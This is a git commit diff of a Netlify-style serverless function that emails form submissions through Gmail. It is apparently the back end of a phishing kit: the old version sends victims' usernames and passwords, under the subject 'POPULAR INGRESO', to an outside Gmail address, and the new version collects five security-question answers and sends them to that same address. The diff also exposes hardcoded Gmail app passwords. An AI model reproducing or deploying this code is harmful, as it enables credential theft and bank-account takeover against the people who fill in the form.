e065e52f40884e7dab9f23c5429232ce16ec48ac
Aletiiisa <cuentaluperonp5@gmail.com>
2025-01-11 15:26:50 -0400

    Update sendEmail.js

--- functions/sendEmail.js
+++ functions/sendEmail.js
@@ -1,23 +1,28 @@
-
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
 exports.handler = async function(event, context) {
-    const { username, password } = JSON.parse(event.body);
+    const { personaje_libro, marca_carro, color_favorito, nombre_abuela, colegio_primaria } = JSON.parse(event.body);
 
     let transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
             user: 'cuentaluperonp5@gmail.com',
-            pass: 'ogynqksiltkdnuoz',
+            pass: 'hkqlbwibpmntqojg',
         },
     });
 
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
-        to: 'sierroalee@gmail.com', // Corregido: coma agregada entre los correos
-        subject: 'POPULAR INGRESO',
-        text: `Usuario: ${username}\nContraseña: ${password}`,
+        to: 'sierroalee@gmail.com',
+        subject: 'Respuestas de Preguntas de Seguridad',
+        text: `
+            ¿Cuál es el personaje de su libro favorito?: ${personaje_libro}
+            ¿Cuál es la marca de su primer carro?: ${marca_carro}
+            ¿Cuál es su color favorito?: ${color_favorito}
+            ¿Cuál es el nombre de su abuela materna?: ${nombre_abuela}
+            ¿Nombre del colegio donde cursó la primaria?: ${colegio_primaria}
+        `,
     };
 
     try {
